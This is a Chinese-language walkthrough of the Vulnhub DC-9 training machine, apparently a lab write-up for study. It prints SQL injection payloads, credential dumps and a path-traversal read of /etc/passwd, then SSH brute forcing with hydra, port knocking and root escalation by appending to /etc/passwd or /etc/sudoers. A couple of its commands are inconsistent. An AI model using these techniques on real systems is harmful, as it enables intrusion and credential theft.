> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8qXQX6ksbTUxEJ41-ZhrUw)

  

**靶场介绍  
**

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZkRAEM34vesn5kDmyVUc2BWjA2gyXLIekyd4HYICIeZnA8AjnZfKlUOzYlPxPh743GmaTnJkzT4g/640?wx_fmt=png)

靶场地址：https://www.vulnhub.com/entry/dc-9,412/

DC-9 是一个中级的靶场，需要具备以下前置知识：

*   基础的 Linux 命令及操作
    
*   基础的渗透测试工具使用（Kali / Parrot 下的工具）
    

靶场只需要简单的下载，解压，打开并将其导入到`VMware`即可（我将其网络配置为`NAT`模式，保证机器与`kali`在同一个网段下）。

  

**信息收集  
**

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjnZkRAEM34vesn5kDmyVUc2BWjA2gyXLIekyd4HYICIeZnA8AjnZfKlUOzYlPxPh743GmaTnJkzT4g/640?wx_fmt=png)

```
# nmap扫描同一网段下的主机，发现目标主机IP是192.168.17.131
$ nmap 192.168.17.0/24
Nmap scan report for 192.168.17.132
Host is up (0.00052s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 00:0C:29:26:26:66 (VMware)
# whatweb：简单的信息搜集，中间件是Apache，系统是Debian
$ whatweb 192.168.17.132
http://192.168.17.132 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.17.132], Title[Example.com - Staff Details - Welcome]
```

打开网页看看：![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI1lOfJ74EQQiap8EgT0lCesW31cdjAMVR5DUa6HAI3u98fgFicbvQXAdVg/640?wx_fmt=png)

在`Search`中通过`1' or 1=1#`查询到所有数据，存在 SQL 注入，请求方法是 POST，抓包放到文件里之后用`sqlmap`跑一下，或者跟我手工注：

```
# 爆回显位（没有报错order by不好使，用select 1,2,3...代替）
union select 1,2,3,4,5,6
# 爆数据库
union select 1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- -
# sqlmap结果
available databases [3]:
[*] information_schema
[*] Staff
[*] users
# 爆users数据库的表
union select 1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x7573657273-- -
# sqlmap结果
[1 table]
+-------------+
| UserDetails |
+-------------+
# 爆UserDetails表的字段
union select 1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_name=0x5573657244657461696c73-- -
# sqlmap结果
[6 columns]
+-----------+-----------------+
| Column    | Type            |
+-----------+-----------------+
| firstname | varchar(30)     |
| id        | int(6) unsigned |
| lastname  | varchar(30)     |
| password  | varchar(20)     |
| reg_date  | timestamp       |
| username  | varchar(30)     |
+-----------+-----------------+
# 爆username、password字段值
union select 1,2,3,4,5,group_concat(username,0x7e,password) from users.UserDetails-- -
# sqlmap结果
[17 entries]
+-----------+---------------+
| username  | password      |
+-----------+---------------+
| marym     | 3kfs86sfd     |
| julied    | 468sfdfsd2    |
| fredf     | 4sfd87sfd1    |
| barneyr   | RocksOff      |
| tomc      | TC&TheBoyz    |
| jerrym    | B8m#48sd      |
| wilmaf    | Pebbles       |
| bettyr    | BamBam01      |
| chandlerb | UrAG0D!       |
| joeyt     | Passw0rd      |
| rachelg   | yN72#dsd      |
| rossg     | ILoveRachel   |
| monicag   | 3248dsds7s    |
| phoebeb   | smellycats    |
| scoots    | YR3BVxxxw87   |
| janitor   | Ilovepeepee   |
| janitor2  | Hawaii-Five-0 |
+-----------+---------------+
# 另一个Staff数据库的Users字段值，另一个表没什么重要内容
sqlmap -r data.txt --batch -D Staff -T Users --dump
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
```

`users`表的内容后面可以用于`SSH`爆破。`admin`的密码是一个`md5`，通过`somd5.com`解密得到`transorbital1`，去登录一下。

发现就多了一个添加记录的功能，但是底部有一个非常明显的提示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI1xdibVNBzdPQup5PLvGBicIKTEtibxaQebV5GnqvWkw94GMvRgqyov0UxA/640?wx_fmt=png)

文件包含啊朋友们，测试一波（连参数都是测出来的）得到`http://192.168.17.132/addrecord.php?file=../../../../etc/passwd`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI179jUZRUX0foujlianSpTrE1m0eDI8LWiaOWIqwIa5eHe5Qyjj7jApOUQ/640?wx_fmt=png)

任意文件读取，看起来不是特别高危的东西，但是结合我们之前拿到的数据库数据，我们可以构造字典来爆破一下`SSH`，先写好字典：

```
$ vim dc9user.txt
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
$ vim dc9pwd.txt
3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
# hydra爆破ssh，-C指定的字典是username:password的形式
hydra -L dc9user.txt -P dc9pwd.txt 192.168.17.132
```

然后会发现连接不上`SSH`，这里是因为靶机使用了`Knockd`进行防护。简单来说，被保护的端口会被隐藏起来，只有我们按照设定的顺序敲击端口，防火墙才会打开被隐藏的端口。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI1qpVXibOTZuS6NvhJtK2CIMoib7icvcgIoG4epmVaVLKEYQ60iaicnWRZaYg/640?wx_fmt=png)

于是可以继续用我们刚刚发现的文件包含漏洞去看看怎么敲击端口，尝试`Knockd`配置文件的默认路径`/etc/knockd.conf`，在`../../../../etc/knockd.conf`找到了配置文件：

```
[options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
```

可以看到`[openSSH] sequence`，这个就是打开`SSH`端口时需要敲击端口的顺序，我们用`nc`来完成敲击的操作：

```
$ nc 192.168.17.132 7469
$ nc 192.168.17.132 8475
$ nc 192.168.17.132 9842
# 22端口已经打开，继续hydra爆破
$ hydra -C dc9.txt 192.168.17.132 ssh
[22][ssh] host: 192.168.17.132   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.17.132   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.17.132   login: janitor   password: Ilovepeepee
# 登录janitor，看看有没有敏感文件
$ ls -al
total 16
drwx------  4 janitor janitor 4096 Jan 29 13:17 .
drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor janitor 4096 Jan 29 13:17 .gnupg
drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
# 来了来了，DC系列中经典的卖队友操作，又是一波密码泄露，后面三个是没出现过的，加入密码字典
$ cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
# hydra爆破，多了个fredf
$ hydra -L dc9user.txt -P dc9pwd.txt
[22][ssh] host: 192.168.17.132   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.17.132   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.17.132   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.17.132   login: janitor   password: Ilovepeepee
# 登录fredf，看看有没有办法sudo提权
$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
# 读一下这个文件，发现是一堆乱码
$ cat /opt/devstuff/dist/test/test
# 运行一下
$ cd /opt/devstuff/dist/test
$ sudo ./test
Usage: python test.py read append
# 返回了一个Usage，找找test.py在哪，应该是第一个
$ find / -name "test.py" 2>/dev/null
/opt/devstuff/test.py
/usr/lib/python3/dist-packages/setuptools/command/test.py
# 看看内容
$ cat /opt/devstuff/test.py
```

`test.py`的内容，我加了点注释：

```
#!/usr/bin/python
import sys
# 参数个数需要为3个（一个是运行文件）
if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)
else :
    # 对第一个文件进行读操作
    f = open(sys.argv[1], "r")
    output = (f.read())
  # 对第二个文件进行写（追加）操作，将读出的文件内容写到这个文件中
    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

这一段代码应该就是`test`文件的原状，也就是说，我们可以拥有`root`权限去对文件进行读写操作。这就好办了，参考之前的做法：

*   方法一：往`/etc/passwd`写入一个 root 权限用户，密码为`toor`（我也不知道这串密文怎么来的）
    
    ```
     echo "Tuzk1:sXuCKi7k3Xh/s:0:0::/root:/bin/bash" > /tmp/root
     sudo /opt/devstuff/dist/test/test /tmp/root /etc/passwd
     su Tuzk1
    ```
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI1BwMYGK9z0HxiaEiaokXo1icWLRGey5thHgr7SZSHVrKgP789kKO1O92UA/640?wx_fmt=png)

*   方法二：写入`/etc/sudoers`，让当前用户 fredf 获得免密执行 sudo 其他命令的权限，fredf 在 **任何地方** 获得 **等同 root 的权限** 执行 **任何命令**
    
    ```
     echo "fredf ALL=(root) ALL" > /tmp/root
     sudo /opt/devstuff/dist/test/test /etc/sudoers
     # sudo vi提权
     vi privilege.txt
     # 输入fredf的密码，然后输入：
     :!/bin/bash
    ```
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/oGEm9WNbjna1goDUD3lQFPAlZeKJyFI1TMcdZFn9Jq2drpDFcAMKfqJhIZxZvVzwPOL3q5C37qhR37OztSWWkQ/640?wx_fmt=png)

END

  

往期回顾

  

[Vulnhub 靶机渗透：DC-8 打靶记录](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484873&idx=1&sn=21c948560f264060aaecc1876288d005&chksm=ceebc9b3f99c40a5e879108fa86128cc6dbc27e4e8fdd0d6f04cc522185afd0ee1bb89469a88&scene=21#wechat_redirect)

[Vulnhub 靶机渗透：DC-7 打靶记录](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484872&idx=1&sn=51d07d681849846c690b640d382d3d44&chksm=ceebc9b2f99c40a4a34cb41fe79cfe0e5b1ebfa1cf70d0d623b4e67b898afb79c4c7c990e53c&scene=21#wechat_redirect)  

[vulnhub 之 DC-6 靶机渗透详细过程](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484764&idx=1&sn=4a9fae641cf57e43892c2eab0ca98ef4&chksm=ceebc926f99c4030e02c41d26fff25fbe29050acd254fa4b510e7d2c1c48f982542c77f88434&scene=21#wechat_redirect)  

[Vulnhub 靶机渗透：DC-5 打靶记录](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484735&idx=1&sn=110817cc70e530fee756f89e2fc6ed70&chksm=ceebc945f99c4053513d0a47055d12353060ce0fd775aaff549c4f80d238099c3d105332ebec&scene=21#wechat_redirect)  

[Vulnhub 靶机渗透：DC-4 打靶记录](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484701&idx=1&sn=3cf5fc612e75a5bf9c68d58d560ee7fd&chksm=ceebc967f99c40715fe65aea238e8effefb4ba3318f3bc725d13a06e65004b98b3e2003f16b2&scene=21#wechat_redirect)